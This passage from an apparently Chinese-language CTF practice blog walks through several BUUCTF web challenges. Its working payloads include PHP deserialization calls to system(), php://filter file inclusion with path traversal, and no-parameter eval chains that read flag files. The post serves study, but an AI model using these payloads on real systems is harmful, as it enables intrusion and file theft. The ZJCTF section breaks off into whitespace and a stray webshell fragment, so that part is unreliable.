<span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"> <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">     &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>过滤了很多常用的函数，尝试反序列化</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a33.png" alt></p>
<p>不在这一层里，返回上一层</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:4:&quot;ls /&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a34.png" alt></p>
<p>还是没有，使用 <code>system(&quot;find / -name flag*&quot;)</code>  来匹配文件名带有 flag 的所有文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a36.png" alt></p>
<p>尝试读取这几个文件吧，这里面路径大部分都是相同的挑着读吧</p>
<p>/sys/devices/platform/serial8250/tty/ttyS25/flags</p>
<p>/sys/devices/virtual/net/lo/flags</p>
<p>/tmp/flagoefiu4r93</p>
<p>最后一个就是 flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=readfile&amp;p=/tmp/flagoefiu4r93</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a37.png" alt></p>
<p 9fe5f299-3d30-4957-9bc2-14ad56a69025>flag</p>
<p>这里看到有个师傅的 payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:25:&quot;cat $(find / -name flag*)&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a38.png" alt></p>
<p>应该是读取了所有的文件， <code>cat $(find / -name flag*)</code>  这段代码能理解为把所有文件名里面带有 flag 的文件当作一个新的变量然后一起读取出来？ <code>$</code>  是建一个 php 变量，可能可以这么理解吧。</p>
<h2 id="bsidescf-2020had-a-bad-day"><a class="markdownIt-Anchor" href="#bsidescf-2020had-a-bad-day">#</a> [BSidesCF 2020]Had a bad day</h2>
<p>进入网页，发现可能存在 sql 注入或者文件包含漏洞</p>
<p><code>http://9f9eacab-cb17-497a-b9bf-5aed58ad2bc7.node5.buuoj.cn:81/index.php?category=woofers</code></p>
<p>使用 php 伪协议尝试读取 index.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a39-17065149223921.png" alt></p>
<p>可以看到 warning 里面的内容 <code>php://filter/convert.base64-encode/resource=index.php.php</code></p>
<p>index.php 后面还有一个后缀，这里尝试删去 payload 里的 <code>.php</code>  看看能否读取成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a40.png" alt></p>
<p>成功读取，base64 解码，提取出有用的信息</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">				<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">						<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span>&#123;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里做个记录：</p>
<blockquote>
<p>strpos ()- 查找字符串在另一字符串中第一次出现的位置（区分大小写）。</p>
<p>strrpos ()- 查找字符串在另一字符串中最后出现的位置（区分大小写）。</p>
<p>stripos ()- 查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</p>
<p>strripos ()- 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）。</p>
<p>strpos(string,find,start)</p>
<p>string：</p>
<p>必须。</p>
<p>规定被搜索的字符串。</p>
<p>find：</p>
<p>必须。</p>
<p>规定要查找的字符。</p>
</blockquote>
<p>代码审计，利用 GET 方式传入的 category 需要有 woofers、meowers、index 三者之一才能包含传入 file 作为文件名</p>
<p>尝试读取 flag.php，经过尝试可以知道 flag 在 woofers 的上一级目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=woofers/../flag</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a41.png" alt></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a42.png" alt></p>
<p>查看源码看到提示 <code>Can you read this flag?</code>  尝试使用 php 伪协议读取</p>
<p>这里记录一下 php://filter 伪协议可以套一层协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/woofers/resource=flag</span><br><span class="line">php://filter/read=index/convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>
<p>这两种嵌套都是可以的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a43.png" alt></p>
<p>base64 解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Can you read this flag? --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> // flag&#123;3d618b09-d7ce-4d87-8464-01fb7bd3285e&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>拿到 flag</p>
<h2 id="bjdctf2020zjctf不过如此"><a class="markdownIt-Anchor" href="#bjdctf2020zjctf不过如此">#</a> [BJDCTF2020] ZJCTF，不过如此</h2>
<p>代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>GET 方式获取两个参数，text 需要 ===I have a dream，file 根据提示利用 php 伪协议读取</p>
<p>构造 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a45.png" alt></p>
<p>base64 解码得到 next.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       <span class="meta">?&gt;</span> -oG muma.php <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<p>蚁剑链接，早最高一级目录找到 flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b07.png" alt></p>
<p>也可以打开终端 cat /flag 得到 flag</p>
<p f718f3f2-717f-411a-8d4d-449f5f3ff03c>flag</p>
<h2 id="gxyctf2019禁止套娃"><a class="markdownIt-Anchor" href="#gxyctf2019禁止套娃">#</a> [GXYCTF2019] 禁止套娃</h2>
<p>学习链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62879498/article/details/124538469">https://blog.csdn.net/m0_62879498/article/details/124538469</a></p>
<p>无参数 RCE 总结：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120738755%E3%80%81https://blog.csdn.net/2301_76690905/article/details/133808536">https://blog.csdn.net/Manuffer/article/details/120738755、https://blog.csdn.net/2301_76690905/article/details/133808536</a></p>
<p>进去就发现是个除了 <code>flag在哪里呢？</code> 这段文字就白的不能再白的页面了，源码也没有，dirsearch 扫描也没有什么其他的文件但是有 /.git 的东西，看了别的师傅的 wp 才知道这个是源码泄露，利用 GitHack 获取源码</p>
<p>贴一个 GitHack 下载地址：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b08.png" alt></p>
<p>扫描完得到一个 index.php，获取到源码了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码审计：</p>
<p>可以看到 preg_match 把 php 伪协议给禁用了，不能使用 data、filter 等</p>
<p>如果 <code>';'===preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp']))</code> ，那么就执行 exp 的内容</p>
<p>对于 <code>[a-z,_]+</code>  的解释 :  <code>[a-z,_]</code>  匹配小写字母和下划线  <code>+</code>  表示 1 到多个</p>
<p>对于 <code>(?R)?</code>  的解释 :  <code>(?R)</code>  代表当前表达式，就是这个 <code>(/[a-z,_]+((?R)?)/)</code> ，所以会一直递归，? 表示递归当前表达式 0 次或 1 次（若是 <code>(?R)*</code>  则表示递归当前表达式 0 次或多次，例如它可以匹配 a (b (c () d ()))）</p>
<p><code>preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp']))</code>  又进行了一次黑名单过滤，类似带有 et、na、info 等字样的函数都不能用了，get、phpinfo 等等都不行了</p>
<p>这里就要用到无参数 rce 了，相关函数做个记录：</p>
<blockquote>
<p>scandir () ：将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob () 可替换）</p>
<p>localeconv () ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个。的用处很大）</p>
<p>current () ：返回数组中的单元，默认取第一个值。注：pos () 和 current () 是同一个东西</p>
<p>pos () ：返回数组中的当前元素的值。pos 是 current 的别名。</p>
<p>getcwd () ：取得当前工作目录</p>
<p>dirname ()：返回路径中的目录部分</p>
<p>array_flip ()：交换数组中的键和值，成功时返回交换后的数组</p>
<p>array_rand () ：从数组中随机取出一个或多个单元</p>
<p>array_reverse ()：将数组内容反转</p>
<p>strrev ()：用于反转给定字符串</p>
<p>chdir () ：函数改变当前的目录。</p>
<p>eval ()、assert ()：命令执行</p>
<p>hightlight_file ()、show_source ()、readfile ()：读取文件内容</p>
</blockquote>
<p>查看当前目录下文件，payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=var_dump(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b09.png" alt></p>
<p>可以看到这个数组，我们想要获取到 flag.php，他在数组的倒二个，我们可以把数组反转然后再用 next () 来获取第二个文件就是 flag.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=var_dump(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b11.png" alt></p>
<p>highlight_file 读取 flag.php 文件，最终 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b10.png" alt></p>
<p a6011114-33f1-49c3-a301-c5027b9b4897>拿到 flag，flag</p>
<h2 id="nctf2019fake-xml-cookbook"><a class="markdownIt-Anchor" href="#nctf2019fake-xml-cookbook">#</a> [NCTF2019]Fake XML cookbook</h2>
